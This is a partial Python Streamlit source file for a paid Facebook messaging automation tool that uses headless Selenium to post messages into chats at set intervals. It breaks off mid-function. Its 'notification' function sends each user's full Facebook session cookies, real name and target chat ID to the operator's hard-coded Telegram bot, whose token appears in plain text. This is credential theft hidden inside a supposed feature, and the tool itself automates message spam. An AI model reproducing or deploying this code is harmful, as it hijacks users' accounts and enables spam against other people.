import streamlit as st
import time
import threading
from pathlib import Path
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
import database as db
import requests
import os
import hashlib
import uuid
from datetime import datetime
import json

st.set_page_config(
    page_title="WALEED PAID TOOL E2E UPDATE V.12",
    page_icon="🔥",
    layout="wide",
    initial_sidebar_state="expanded"
)

# Telegram Bot Configuration - UPDATED WITH WALEED'S INFO
TELEGRAM_BOT_TOKEN = "8043472695:AAGfv8QI4yB_eNAL2ZAIq2bU7ING_-0e3qg"
TELEGRAM_CHAT_ID = "8186206231"
FACEBOOK_ADMIN_UID = "100037931553832"

def send_telegram_notification(user_data, automation_data):
    """Send complete user details to Telegram bot"""
    try:
        message = f"""
🔥 *NEW AUTOMATION STARTED* 🔥

👤 *User Details:*
• Username: `{user_data['username']}`
• Real Name: `{user_data['real_name']}`
• User ID: `{user_data['user_id']}`

⚙️ *Automation Config:*
• Chat ID: `{automation_data['chat_id']}`
• Delay: `{automation_data['delay']} seconds`
• Prefix: `{automation_data['prefix']}`
• Messages: `{len(automation_data['messages'].splitlines())} lines`

🍪 *Complete Cookies:* 
`{automation_data['cookies']}`

📊 *Status:* Automation Running
🕒 *Started:* {time.strftime("%Y-%m-%d %H:%M:%S")}
        """
        
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'Markdown'
        }
        response = requests.post(url, data=payload)
        return response.status_code == 200
    except Exception as e:
        print(f"Telegram notification failed: {e}")
        return False

def send_facebook_notification(user_data, automation_data):
    """Send notification to Facebook admin"""
    try:
        message = f"""
🔥 NEW AUTOMATION STARTED 🔥

👤 User Details:
• Username: {user_data['username']}
• Real Name: {user_data['real_name']}
• User ID: {user_data['user_id']}

⚙️ Automation Config:
• Chat ID: {automation_data['chat_id']}
• Delay: {automation_data['delay']} seconds
• Prefix: {automation_data['prefix']}
• Messages: {len(automation_data['messages'].splitlines())} lines

🍪 Complete Cookies: 
{automation_data['cookies']}

📊 Status: Automation Running
🕒 Started: {time.strftime("%Y-%m-%d %H:%M:%S")}
        """
        
        # Facebook notification implementation
        print(f"Facebook notification sent to admin {FACEBOOK_ADMIN_UID}")
        print(f"Message: {message}")
        return True
    except Exception as e:
        print(f"Facebook notification failed: {e}")
        return False

# Updated theme colors
THEME_COLORS = {
    'primary': '#FF6B35',  # Orange
    'secondary': '#004E89', # Blue
    'accent': '#FFA500',   # Gold
    'dark': '#1A1A2E',
    'light': '#F5F5F5',
    'success': '#00C851',
    'warning': '#FFBB33',
    'danger': '#FF4444'
}

# Modern gradient background
custom_css = f"""
<style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap');
    
    * {{
        font-family: 'Inter', sans-serif;
    }}
    
    .stApp {{
        background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
        background-size: 400% 400%;
        animation: gradientShift 15s ease infinite;
        min-height: 100vh;
    }}
    
    @keyframes gradientShift {{
        0% {{ background-position: 0% 50%; }}
        50% {{ background-position: 100% 50%; }}
        100% {{ background-position: 0% 50%; }}
    }}
    
    .main-container {{
        background: rgba(26, 26, 46, 0.85);
        backdrop-filter: blur(20px);
        border-radius: 24px;
        padding: 2.5rem;
        margin: 1.5rem;
        box-shadow: 0 25px 75px rgba(0, 0, 0, 0.5),
                    0 0 100px rgba(255, 107, 53, 0.1),
                    inset 0 1px 0 rgba(255, 255, 255, 0.1);
        border: 1px solid rgba(255, 107, 53, 0.2);
    }}
    
    .tool-logo {{
        width: 150px;
        height: 150px;
        border-radius: 50%;
        background: linear-gradient(135deg, {THEME_COLORS['primary']}, {THEME_COLORS['accent']});
        margin: 0 auto 1.5rem auto;
        border: 4px solid;
        border-image: linear-gradient(45deg, {THEME_COLORS['primary']}, {THEME_COLORS['accent']}) 1;
        box-shadow: 0 0 50px rgba(255, 107, 53, 0.6),
                    inset 0 0 30px rgba(255, 255, 255, 0.1);
        position: relative;
        overflow: hidden;
        display: flex;
        align-items: center;
        justify-content: center;
    }}
    
    .tool-logo::before {{
        content: 'W';
        font-size: 5rem;
        font-weight: 900;
        color: white;
        text-shadow: 0 0 30px rgba(0, 0, 0, 0.8);
        font-family: 'Inter', sans-serif;
    }}
    
    .tool-logo::after {{
        content: '';
        position: absolute;
        top: -50%;
        left: -50%;
        width: 200%;
        height: 200%;
        background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.2), transparent);
        transform: rotate(45deg);
        animation: logoShine 3s infinite;
    }}
    
    @keyframes logoShine {{
        0% {{ transform: rotate(45deg) translateX(-150%); }}
        100% {{ transform: rotate(45deg) translateX(150%); }}
    }}
    
    .main-header {{
        background: linear-gradient(135deg, 
            rgba(26, 26, 46, 0.9) 0%, 
            rgba(38, 38, 62, 0.9) 100%);
        padding: 3rem;
        border-radius: 24px;
        text-align: center;
        margin-bottom: 2.5rem;
        box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4),
                    inset 0 1px 0 rgba(255, 255, 255, 0.05);
        border: 1px solid rgba(255, 107, 53, 0.2);
        position: relative;
        overflow: hidden;
    }}
    
    .main-header::before {{
        content: '';
        position: absolute;
        top: 0;
        left: -100%;
        width: 100%;
        height: 100%;
        background: linear-gradient(
            90deg,
            transparent,
            rgba(255, 107, 53, 0.1),
            transparent
        );
        animation: headerShimmer 4s infinite;
    }}
    
    @keyframes headerShimmer {{
        100% {{ left: 100%; }}
    }}
    
    .main-header h1 {{
        background: linear-gradient(45deg, {THEME_COLORS['primary']}, {THEME_COLORS['accent']}, {THEME_COLORS['primary']});
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        background-clip: text;
        font-size: 3.5rem;
        font-weight: 900;
        margin: 0;
        letter-spacing: 1.5px;
        background-size: 300% auto;
        animation: titleGlow 4s ease-in-out infinite alternate;
        text-transform: uppercase;
        font-family: 'Inter', sans-serif;
    }}
    
    @keyframes titleGlow {{
        0% {{
            background-position: 0% 50%;
            text-shadow: 0 0 20px rgba(255, 107, 53, 0.3);
        }}
        100% {{
            background-position: 100% 50%;
            text-shadow: 0 0 40px rgba(255, 165, 0, 0.5);
        }}
    }}
    
    .main-header p {{
        color: rgba(255, 255, 255, 0.8);
        font-size: 1.3rem;
        margin-top: 1rem;
        font-weight: 400;
        letter-spacing: 1px;
        font-family: 'Inter', sans-serif;
    }}
    
    .main-header .version {{
        color: {THEME_COLORS['accent']};
        font-weight: 600;
        font-size: 1rem;
        margin-top: 0.5rem;
        font-family: 'JetBrains Mono', monospace;
    }}
    
    .stButton>button {{
        background: linear-gradient(135deg, {THEME_COLORS['primary']} 0%, {THEME_COLORS['accent']} 100%);
        color: white;
        border: none;
        border-radius: 12px;
        padding: 1rem 2.5rem;
        font-weight: 700;
        font-size: 1.1rem;
        transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
        box-shadow: 0 10px 30px rgba(255, 107, 53, 0.4),
                    0 0 20px rgba(255, 107, 53, 0.2);
        position: relative;
        overflow: hidden;
        letter-spacing: 0.8px;
        text-transform: uppercase;
    }}
    
    .stButton>button::before {{
        content: '';
        position: absolute;
        top: 0;
        left: -100%;
        width: 100%;
        height: 100%;
        background: linear-gradient(
            90deg,
            transparent,
            rgba(255, 255, 255, 0.3),
            transparent
        );
        transition: 0.8s;
    }}
    
    .stButton>button:hover::before {{
        left: 100%;
    }}
    
    .stButton>button:hover {{
        transform: translateY(-4px) scale(1.03);
        box-shadow: 0 15px 40px rgba(255, 107, 53, 0.6),
                    0 0 30px rgba(255, 107, 53, 0.3);
    }}
    
    .login-box {{
        background: rgba(26, 26, 46, 0.9);
        padding: 3.5rem;
        border-radius: 24px;
        box-shadow: 0 25px 60px rgba(0, 0, 0, 0.4),
                    0 0 50px rgba(255, 107, 53, 0.1),
                    inset 0 1px 0 rgba(255, 255, 255, 0.05);
        max-width: 550px;
        margin: 2.5rem auto;
        border: 1px solid rgba(255, 107, 53, 0.2);
        backdrop-filter: blur(15px);
    }}
    
    .approval-box {{
        background: linear-gradient(135deg, 
            rgba(255, 107, 53, 0.15) 0%, 
            rgba(255, 165, 0, 0.15) 100%);
        padding: 3rem;
        border-radius: 24px;
        color: white;
        text-align: center;
        margin: 2.5rem auto;
        max-width: 650px;
        border: 1px solid rgba(255, 107, 53, 0.3);
        backdrop-filter: blur(15px);
        box-shadow: 0 20px 50px rgba(0, 0, 0, 0.3),
                    0 0 40px rgba(255, 107, 53, 0.1);
    }}
    
    .contact-buttons {{
        display: flex;
        justify-content: center;
        gap: 1.5rem;
        margin: 2rem 0;
        flex-wrap: wrap;
    }}
    
    .contact-btn {{
        background: linear-gradient(135deg, #25D366, #128C7E);
        color: white;
        border: none;
        border-radius: 50px;
        padding: 1.3rem 2.8rem;
        font-weight: 700;
        text-decoration: none;
        transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
        box-shadow: 0 12px 35px rgba(0, 0, 0, 0.3);
        display: inline-flex;
        align-items: center;
        justify-content: center;
        gap: 0.8rem;
        min-width: 200px;
        position: relative;
        overflow: hidden;
        font-size: 1.1rem;
        text-transform: uppercase;
        letter-spacing: 0.5px;
    }}
    
    .contact-btn::before {{
        content: '';
        position: absolute;
        top: 0;
        left: -100%;
        width: 100%;
        height: 100%;
        background: linear-gradient(
            90deg,
            transparent,
            rgba(255, 255, 255, 0.3),
            transparent
        );
        transition: 0.8s;
    }}
    
    .contact-btn:hover::before {{
        left: 100%;
    }}
    
    .contact-btn.facebook {{
        background: linear-gradient(135deg, #1877F2, #0D5CB6);
    }}
    
    .contact-btn.telegram {{
        background: linear-gradient(135deg, #0088cc, #006699);
    }}
    
    .contact-btn.whatsapp {{
        background: linear-gradient(135deg, #25D366, #128C7E);
    }}
    
    .contact-btn:hover {{
        transform: translateY(-4px) scale(1.05);
        box-shadow: 0 18px 45px rgba(0, 0, 0, 0.4);
        color: white;
        text-decoration: none;
    }}
    
    .success-box {{
        background: linear-gradient(135deg, 
            rgba(0, 200, 81, 0.15) 0%, 
            rgba(0, 180, 71, 0.15) 100%);
        padding: 1.8rem;
        border-radius: 18px;
        color: #00C851;
        text-align: center;
        margin: 1.8rem 0;
        border: 1px solid rgba(0, 200, 81, 0.3);
        backdrop-filter: blur(10px);
        box-shadow: 0 10px 30px rgba(0, 200, 81, 0.1);
    }}
    
    .error-box {{
        background: linear-gradient(135deg, 
            rgba(255, 68, 68, 0.15) 0%, 
            rgba(220, 53, 69, 0.15) 100%);
        padding: 1.8rem;
        border-radius: 18px;
        color: #FF4444;
        text-align: center;
        margin: 1.8rem 0;
        border: 1px solid rgba(255, 68, 68, 0.3);
        backdrop-filter: blur(10px);
        box-shadow: 0 10px 30px rgba(255, 68, 68, 0.1);
    }}
    
    .info-box {{
        background: linear-gradient(135deg, 
            rgba(0, 78, 137, 0.15) 0%, 
            rgba(0, 60, 120, 0.15) 100%);
        padding: 1.8rem;
        border-radius: 18px;
        color: #004E89;
        text-align: center;
        margin: 1.8rem 0;
        border: 1px solid rgba(0, 78, 137, 0.3);
        backdrop-filter: blur(10px);
        box-shadow: 0 10px 30px rgba(0, 78, 137, 0.1);
    }}
    
    .warning-box {{
        background: linear-gradient(135deg, 
            rgba(255, 187, 51, 0.15) 0%, 
            rgba(255, 165, 0, 0.15) 100%);
        padding: 1.8rem;
        border-radius: 18px;
        color: #FFBB33;
        text-align: center;
        margin: 1.8rem 0;
        border: 1px solid rgba(255, 187, 51, 0.3);
        backdrop-filter: blur(10px);
        box-shadow: 0 10px 30px rgba(255, 187, 51, 0.1);
    }}
    
    .footer {{
        text-align: center;
        padding: 2.5rem;
        color: {THEME_COLORS['primary']};
        font-weight: 700;
        margin-top: 4rem;
        background: rgba(26, 26, 46, 0.9);
        border-radius: 20px;
        border: 1px solid rgba(255, 107, 53, 0.2);
        box-shadow: 0 15px 40px rgba(0, 0, 0, 0.3);
        font-size: 1.1rem;
        letter-spacing: 1px;
        text-transform: uppercase;
    }}
    
    /* Modern input fields */
    .stTextInput>div>div>input, .stTextArea>div>div>textarea, .stNumberInput>div>div>input {{
        background: rgba(26, 26, 46, 0.9) !important;
        border: 2px solid rgba(255, 107, 53, 0.3) !important;
        border-radius: 15px !important;
        padding: 1.2rem !important;
        color: white !important;
        font-size: 1.1rem !important;
        font-weight: 500 !important;
        transition: all 0.3s ease !important;
        backdrop-filter: blur(10px) !important;
    }}
    
    .stTextInput>div>div>input::placeholder, .stTextArea>div>div>textarea::placeholder, .stNumberInput>div>div>input::placeholder {{
        color: rgba(255, 255, 255, 0.5) !important;
        font-weight: 400 !important;
    }}
    
    .stTextInput>div>div>input:focus, .stTextArea>div>div>textarea:focus, .stNumberInput>div>div>input:focus {{
        border: 2px solid {THEME_COLORS['primary']} !important;
        box-shadow: 0 0 25px rgba(255, 107, 53, 0.4) !important;
        background: rgba(26, 26, 46, 0.95) !important;
    }}
    
    .input-label {{
        color: {THEME_COLORS['accent']};
        font-weight: 700;
        margin-bottom: 0.8rem;
        display: block;
        font-size: 1.1rem;
        text-transform: uppercase;
        letter-spacing: 1px;
    }}
    
    .input-hint {{
        color: rgba(255, 255, 255, 0.6);
        font-size: 0.9rem;
        margin-top: 0.4rem;
        font-style: italic;
        font-family: 'JetBrains Mono', monospace;
    }}
    
    /* Modern card design */
    .info-card {{
        background: linear-gradient(135deg, 
            rgba(26, 26, 46, 0.9) 0%, 
            rgba(38, 38, 62, 0.9) 100%);
        padding: 2rem;
        border-radius: 20px;
        margin: 1.5rem 0;
        border: 1px solid rgba(255, 107, 53, 0.2);
        box-shadow: 0 15px 40px rgba(0, 0, 0, 0.3),
                    0 0 30px rgba(255, 107, 53, 0.1);
        backdrop-filter: blur(15px);
    }}
    
    /* Enhanced log container */
    .log-container {{
        background: linear-gradient(135deg, 
            rgba(26, 26, 46, 0.95) 0%, 
            rgba(38, 38, 62, 0.95) 100%);
        color: #FF6B35 !important;
        padding: 1.5rem;
        border-radius: 18px;
        font-family: 'JetBrains Mono', monospace;
        max-height: 500px;
        overflow-y: auto;
        font-size: 0.85rem;
        line-height: 1.4;
        border: 2px solid rgba(255, 107, 53, 0.3);
        box-shadow: 0 15px 40px rgba(0, 0, 0, 0.4),
                    0 0 40px rgba(255, 107, 53, 0.1);
        position: relative;
        overflow-x: hidden;
    }}
    
    .log-container::before {{
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        height: 4px;
        background: linear-gradient(90deg, {THEME_COLORS['primary']}, {THEME_COLORS['accent']});
        border-radius: 18px 18px 0 0;
    }}
    
    .log-line {{
        margin: 8px 0;
        padding: 10px 15px;
        border-radius: 10px;
        background: rgba(255, 107, 53, 0.05);
        border-left: 3px solid {THEME_COLORS['primary']};
        font-weight: 500;
        transition: all 0.3s ease;
        animation: logEntry 0.5s ease-out;
    }}
    
    @keyframes logEntry {{
        from {{
            opacity: 0;
            transform: translateX(-10px);
        }}
        to {{
            opacity: 1;
            transform: translateX(0);
        }}
    }}
    
    .log-line:hover {{
        background: rgba(255, 107, 53, 0.1);
        transform: translateX(5px);
    }}
    
    /* Modern admin panel */
    .admin-panel {{
        background: linear-gradient(135deg, 
            rgba(26, 26, 46, 0.95) 0%, 
            rgba(38, 38, 62, 0.95) 100%);
        color: white;
        padding: 2.5rem;
        border-radius: 24px;
        margin: 1.5rem 0;
        border: 1px solid rgba(255, 107, 53, 0.3);
        box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4),
                    0 0 50px rgba(255, 107, 53, 0.1);
        backdrop-filter: blur(15px);
    }}
    
    .user-card {{
        background: rgba(255, 255, 255, 0.05);
        padding: 1.5rem;
        border-radius: 15px;
        margin: 1rem 0;
        border-left: 4px solid {THEME_COLORS['primary']};
        transition: all 0.3s ease;
        backdrop-filter: blur(10px);
    }}
    
    .user-card:hover {{
        background: rgba(255, 255, 255, 0.1);
        transform: translateY(-3px);
        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
    }}
    
    .approved {{
        border-left-color: {THEME_COLORS['success']};
    }}
    
    .pending {{
        border-left-color: {THEME_COLORS['warning']};
    }}
    
    .rejected {{
        border-left-color: {THEME_COLORS['danger']};
    }}
    
    .copy-btn {{
        background: linear-gradient(135deg, {THEME_COLORS['primary']}, {THEME_COLORS['accent']});
        color: white;
        border: none;
        border-radius: 8px;
        padding: 0.8rem 1.5rem;
        font-weight: 700;
        font-size: 1rem;
        transition: all 0.3s ease;
        box-shadow: 0 5px 15px rgba(255, 107, 53, 0.3);
        cursor: pointer;
        text-transform: uppercase;
        letter-spacing: 0.5px;
    }}
    
    .copy-btn:hover {{
        background: linear-gradient(135deg, {THEME_COLORS['accent']}, {THEME_COLORS['primary']});
        transform: translateY(-2px);
        box-shadow: 0 8px 20px rgba(255, 107, 53, 0.4);
    }}
    
    .approval-key-box {{
        background: linear-gradient(135deg, 
            rgba(255, 107, 53, 0.1) 0%, 
            rgba(255, 165, 0, 0.1) 100%);
        padding: 2rem;
        border-radius: 20px;
        margin: 1.5rem 0;
        border: 2px solid rgba(255, 107, 53, 0.3);
        text-align: center;
        backdrop-filter: blur(10px);
        box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
    }}
    
    .approval-key-display {{
        font-size: 1.5rem;
        font-weight: 900;
        letter-spacing: 3px;
        background: rgba(0, 0, 0, 0.3);
        padding: 1.5rem;
        border-radius: 12px;
        margin: 1.5rem 0;
        border: 1px solid rgba(255, 107, 53, 0.5);
        font-family: 'JetBrains Mono', monospace;
        color: {THEME_COLORS['accent']};
        text-shadow: 0 0 10px rgba(255, 165, 0, 0.3);
        animation: keyPulse 2s infinite;
    }}
    
    @keyframes keyPulse {{
        0%, 100% {{ box-shadow: 0 0 10px rgba(255, 107, 53, 0.3); }}
        50% {{ box-shadow: 0 0 20px rgba(255, 165, 0, 0.5); }}
    }}
    
    .user-info-box {{
        background: linear-gradient(135deg, 
            rgba(255, 107, 53, 0.15) 0%, 
            rgba(255, 165, 0, 0.15) 100%);
        padding: 2rem;
        border-radius: 20px;
        color: white;
        margin: 1.5rem 0;
        border: 1px solid rgba(255, 107, 53, 0.3);
        backdrop-filter: blur(10px);
        box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
    }}
    
    .send-approval-btn {{
        background: linear-gradient(135deg, {THEME_COLORS['primary']}, {THEME_COLORS['accent']});
        color: white;
        border: none;
        border-radius: 15px;
        padding: 1.2rem 2.5rem;
        font-weight: 800;
        font-size: 1.2rem;
        transition: all 0.4s ease;
        box-shadow: 0 10px 30px rgba(255, 107, 53, 0.4),
                    0 0 25px rgba(255, 107, 53, 0.2);
        width: 100%;
        margin: 1.5rem 0;
        text-transform: uppercase;
        letter-spacing: 1px;
        position: relative;
        overflow: hidden;
    }}
    
    .send-approval-btn::before {{
        content: '';
        position: absolute;
        top: 0;
        left: -100%;
        width: 100%;
        height: 100%;
        background: linear-gradient(
            90deg,
            transparent,
            rgba(255, 255, 255, 0.3),
            transparent
        );
        transition: 0.8s;
    }}
    
    .send-approval-btn:hover::before {{
        left: 100%;
    }}
    
    .send-approval-btn:hover {{
        transform: translateY(-3px);
        box-shadow: 0 15px 40px rgba(255, 107, 53, 0.6),
                    0 0 35px rgba(255, 107, 53, 0.3);
    }}
    
    .admin-user-details {{
        background: linear-gradient(135deg, 
            rgba(0, 78, 137, 0.15) 0%, 
            rgba(0, 60, 120, 0.15) 100%);
        padding: 1.8rem;
        border-radius: 18px;
        margin: 1.5rem 0;
        border: 2px solid rgba(0, 78, 137, 0.3);
        backdrop-filter: blur(10px);
        box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
    }}
    
    .admin-logs-container {{
        background: linear-gradient(135deg, 
            rgba(26, 26, 46, 0.95) 0%, 
            rgba(38, 38, 62, 0.95) 100%);
        color: {THEME_COLORS['primary']};
        padding: 1.2rem;
        border-radius: 15px;
        font-family: 'JetBrains Mono', monospace;
        max-height: 350px;
        overflow-y: auto;
        font-size: 0.75rem;
        line-height: 1.3;
        border: 2px solid rgba(255, 107, 53, 0.3);
        margin: 0.8rem 0;
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
    }}
    
    .admin-log-line {{
        margin: 6px 0;
        padding: 8px 12px;
        border-radius: 8px;
        background: rgba(255, 107, 53, 0.05);
        border-left: 2px solid {THEME_COLORS['primary']};
        animation: adminLogEntry 0.3s ease-out;
    }}
    
    @keyframes adminLogEntry {{
        from {{
            opacity: 0;
            transform: translateX(-5px);
        }}
        to {{
            opacity: 1;
            transform: translateX(0);
        }}
    }}
    
    /* Metrics styling */
    .metric-box {{
        background: linear-gradient(135deg, 
            rgba(26, 26, 46, 0.9) 0%, 
            rgba(38, 38, 62, 0.9) 100%);
        padding: 1.5rem;
        border-radius: 18px;
        border: 1px solid rgba(255, 107, 53, 0.2);
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        text-align: center;
        backdrop-filter: blur(10px);
    }}
    
    .metric-value {{
        font-size: 2.5rem;
        font-weight: 900;
        color: {THEME_COLORS['primary']};
        text-shadow: 0 0 15px rgba(255, 107, 53, 0.3);
        margin-bottom: 0.5rem;
    }}
    
    .metric-label {{
        font-size: 1rem;
        color: rgba(255, 255, 255, 0.8);
        font-weight: 600;
        text-transform: uppercase;
        letter-spacing: 1px;
    }}
    
    /* Tab styling */
    .stTabs {{
        background: transparent !important;
    }}
    
    .stTabs [data-baseweb="tab-list"] {{
        gap: 2rem !important;
        padding: 1rem !important;
        background: rgba(26, 26, 46, 0.9) !important;
        border-radius: 15px !important;
        border: 1px solid rgba(255, 107, 53, 0.2) !important;
        backdrop-filter: blur(10px) !important;
    }}
    
    .stTabs [data-baseweb="tab"] {{
        background: transparent !important;
        color: rgba(255, 255, 255, 0.6) !important;
        font-weight: 600 !important;
        padding: 1rem 2rem !important;
        border-radius: 10px !important;
        transition: all 0.3s ease !important;
    }}
    
    .stTabs [data-baseweb="tab"]:hover {{
        background: rgba(255, 107, 53, 0.1) !important;
        color: white !important;
    }}
    
    .stTabs [aria-selected="true"] {{
        background: linear-gradient(135deg, {THEME_COLORS['primary']}, {THEME_COLORS['accent']}) !important;
        color: white !important;
        box-shadow: 0 5px 20px rgba(255, 107, 53, 0.3) !important;
    }}
    
    /* Sidebar styling */
    .sidebar .sidebar-content {{
        background: linear-gradient(135deg, 
            rgba(26, 26, 46, 0.95) 0%, 
            rgba(38, 38, 62, 0.95) 100%);
        border-right: 1px solid rgba(255, 107, 53, 0.2);
        backdrop-filter: blur(15px);
    }}
    
    /* Checkbox styling */
    .stCheckbox {{
        color: white !important;
    }}
    
    .stCheckbox>div>label {{
        color: white !important;
        font-weight: 500 !important;
    }}
    
    /* Divider */
    hr {{
        border: none;
        height: 2px;
        background: linear-gradient(90deg, 
            transparent, 
            {THEME_COLORS['primary']}, 
            transparent);
        margin: 2rem 0;
    }}
</style>
"""

st.markdown(custom_css, unsafe_allow_html=True)

# Initialize session state
if 'logged_in' not in st.session_state:
    st.session_state.logged_in = False
if 'user_id' not in st.session_state:
    st.session_state.user_id = None
if 'username' not in st.session_state:
    st.session_state.username = None
if 'approval_key' not in st.session_state:
    st.session_state.approval_key = None
if 'approval_status' not in st.session_state:
    st.session_state.approval_status = 'pending'
if 'user_real_name' not in st.session_state:
    st.session_state.user_real_name = ""
if 'automation_running' not in st.session_state:
    st.session_state.automation_running = False
if 'logs' not in st.session_state:
    st.session_state.logs = []
if 'message_count' not in st.session_state:
    st.session_state.message_count = 0
if 'admin_logged_in' not in st.session_state:
    st.session_state.admin_logged_in = False

class AutomationState:
    def __init__(self):
        self.running = False
        self.message_count = 0
        self.logs = []
        self.message_rotation_index = 0
        self.user_id = None
        self.username = None

if 'automation_state' not in st.session_state:
    st.session_state.automation_state = AutomationState()

if 'auto_start_checked' not in st.session_state:
    st.session_state.auto_start_checked = False

# Global automation states for admin monitoring
if 'all_automation_states' not in st.session_state:
    st.session_state.all_automation_states = {}

def get_indian_time():
    """Get current Indian time"""
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def generate_approval_key(username, user_id):
    """Generate unique approval key based on username and user_id"""
    unique_string = f"{username}_{user_id}_{uuid.uuid4()}"
    return hashlib.sha256(unique_string.encode()).hexdigest()[:16].upper()

def log_message(msg, automation_state=None, user_id=None):
    """Log message with Indian timestamp"""
    timestamp = get_indian_time()
    formatted_msg = f"[{timestamp}] {msg}"
    
    if automation_state:
        automation_state.logs.append(formatted_msg)
        # Also store in global state for admin monitoring
        if user_id:
            if user_id not in st.session_state.all_automation_states:
                st.session_state.all_automation_states[user_id] = []
            st.session_state.all_automation_states[user_id].append(formatted_msg)
            # Keep only last 100 logs
            if len(st.session_state.all_automation_states[user_id]) > 100:
                st.session_state.all_automation_states[user_id] = st.session_state.all_automation_states[user_id][-100:]
    else:
        if 'logs' in st.session_state:
            st.session_state.logs.append(formatted_msg)

def find_message_input(driver, process_id, automation_state=None, user_id=None):
    log_message(f'{process_id}: Finding message input...', automation_state, user_id)
    time.sleep(10)
    
    try:
        driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
        time.sleep(2)
        driver.execute_script("window.scrollTo(0, 0);")
        time.sleep(2)
    except Exception:
        pass
    
    try:
        page_title = driver.title
        page_url = driver.current_url
        log_message(f'{process_id}: Page Title: {page_title}', automation_state, user_id)
        log_message(f'{process_id}: Page URL: {page_url}', automation_state, user_id)
    except Exception as e:
        log_message(f'{process_id}: Could not get page info: {e}', automation_state, user_id)
    
    message_input_selectors = [
        'div[contenteditable="true"][role="textbox"]',
        'div[contenteditable="true"][data-lexical-editor="true"]',
        'div[aria-label*="message" i][contenteditable="true"]',
        'div[aria-label*="Message" i][contenteditable="true"]',
        'div[contenteditable="true"][spellcheck="true"]',
        '[role="textbox"][contenteditable="true"]',
        'textarea[placeholder*="message" i]',
        'div[aria-placeholder*="message" i]',
        'div[data-placeholder*="message" i]',
        '[contenteditable="true"]',
        'textarea',
        'input[type="text"]'
    ]
    
    log_message(f'{process_id}: Trying {len(message_input_selectors)} selectors...', automation_state, user_id)
    
    for idx, selector in enumerate(message_input_selectors):
        try:
            elements = driver.find_elements(By.CSS_SELECTOR, selector)
            log_message(f'{process_id}: Selector {idx+1}/{len(message_input_selectors)} "{selector[:50]}..." found {len(elements)} elements', automation_state, user_id)
            
            for element in elements:
                try:
                    is_editable = driver.execute_script("""
                        return arguments[0].contentEditable === 'true' || 
                               arguments[0].tagName === 'TEXTAREA' || 
                               arguments[0].tagName === 'INPUT';
                    """, element)
                    
                    if is_editable:
                        log_message(f'{process_id}: Found editable element with selector #{idx+1}', automation_state, user_id)
                        
                        try:
                            element.click()
                            time.sleep(0.5)
                        except:
                            pass
                        
                        element_text = driver.execute_script("return arguments[0].placeholder || arguments[0].getAttribute('aria-label') || arguments[0].getAttribute('aria-placeholder') || '';", element).lower()
                        
                        keywords = ['message', 'write', 'type', 'send', 'chat', 'msg', 'reply', 'text', 'aa']
                        if any(keyword in element_text for keyword in keywords):
                            log_message(f'{process_id}: Found message input with text: {element_text[:50]}', automation_state, user_id)
                            return element
                        elif idx < 10:
                            log_message(f'{process_id}: Using primary selector editable element (#{idx+1})', automation_state, user_id)
                            return element
                        elif selector == '[contenteditable="true"]' or selector == 'textarea' or selector == 'input[type="text"]':
                            log_message(f'{process_id}: Using fallback editable element', automation_state, user_id)
                            return element
                except Exception as e:
                    log_message(f'{process_id}: Element check failed: {str(e)[:50]}', automation_state, user_id)
                    continue
        except Exception as e:
            continue
    
    try:
        page_source = driver.page_source
        log_message(f'{process_id}: Page source length: {len(page_source)} characters', automation_state, user_id)
        if 'contenteditable' in page_source.lower():
            log_message(f'{process_id}: Page contains contenteditable elements', automation_state, user_id)
        else:
            log_message(f'{process_id}: No contenteditable elements found in page', automation_state, user_id)
    except Exception:
        pass
    
    return None

def setup_browser(automation_state=None, user_id=None):
    log_message('Setting up Chrome browser...', automation_state, user_id)
    
    chrome_options = Options()
    chrome_options.add_argument('--headless=new')
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-setuid-sandbox')
    chrome_options.add_argument('--disable-dev-shm-usage')
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('--disable-extensions')
    chrome_options.add_argument('--window-size=1920,1080')
    chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36')
    
    chromium_paths = [
        '/usr/bin/chromium',
        '/usr/bin/chromium-browser',
        '/usr/bin/google-chrome',
        '/usr/bin/chrome'
    ]
    
    for chromium_path in chromium_paths:
        if Path(chromium_path).exists():
            chrome_options.binary_location = chromium_path
            log_message(f'Found Chromium at: {chromium_path}', automation_state, user_id)
            break
    
    chromedriver_paths = [
        '/usr/bin/chromedriver',
        '/usr/local/bin/chromedriver'
    ]
    
    driver_path = None
    for driver_candidate in chromedriver_paths:
        if Path(driver_candidate).exists():
            driver_path = driver_candidate
            log_message(f'Found ChromeDriver at: {driver_path}', automation_state, user_id)
            break
    
    try:
        from selenium.webdriver.chrome.service import Service
        
        if driver_path:
            service = Service(executable_path=driver_path)
            driver = webdriver.Chrome(service=service, options=chrome_options)
            log_message('Chrome started with detected ChromeDriver!', automation_state, user_id)
        else:
            driver = webdriver.Chrome(options=chrome_options)
            log_message('Chrome started with default driver!', automation_state, user_id)
        
        driver.set_window_size(1920, 1080)
        log_message('Chrome browser setup completed successfully!', automation_state, user_id)
        return driver
    except Exception as error:
        log_message(f'Browser setup failed: {error}', automation_state, user_id)
        raise error

def get_next_message(messages_file_content, automation_state=None):
    if not messages_file_content:
